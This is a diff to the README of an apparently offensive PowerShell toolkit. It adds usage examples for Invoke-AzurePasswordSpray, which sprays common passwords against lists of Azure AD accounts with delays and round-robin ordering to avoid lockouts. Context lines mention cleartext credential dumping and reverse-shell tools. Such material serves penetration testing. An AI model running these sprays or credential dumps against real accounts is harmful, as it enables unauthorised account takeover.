@@ -159,4 +159,20 @@ For Example
 Get-ClearTextPassword -WiFi -SNMP -Chrome -PasswordVault
 ```
 
+- Invoke-AzurePasswordSpray can be used to perform a password dictionary attack against a single user or multiple users while testing credentials against Azure AD.
+```powershell
+Invoke-AzurePasswordSpray -UserName "rob@domain.com","john@domain.com" -Passwd 'Password123!','asdf123!'
+# This Example tests the passwords defined against the list of usernames defined
+
+Invoke-AzurePasswordSpray -UserName "rob@domain.com","john@domain.com" -Passwd 'Password123!','asdf123!' -SleepSeconds 60
+# This Example tests the passwords defined against the list of usernames defined with a 60 second wait before the next sign in attempt
+
+Invoke-AzurePasswordSpray -UserName "rob@domain.com","john@domain.com" -Passwd 'Password123!','asdf123!' -SleepSeconds 60 -RoundRobin
+# This Example tests the passwords defined against the list of usernames defined with a 60 second wait before the next sign in attempt. This performs authentication attempts in a Round Robin fashion for the defined usernames
+
+$UserNames = "rob@domain.com","john@domain.com","dixie@domain.com","chris@domain.com"
+$UserNames | Invoke-AzurePasswordSpray -Passwd "Password123!" -RoundRobin
+# This Example tests the passwords defined against the list of usernames defined in a Round Robin fashion
+```
+
 For more information on Start-Listener, Start-Bind, and Invoke-ReversePowerShell see [https://github.com/tobor88/ReversePowerShell](https://github.com/tobor88/ReversePowerShell)
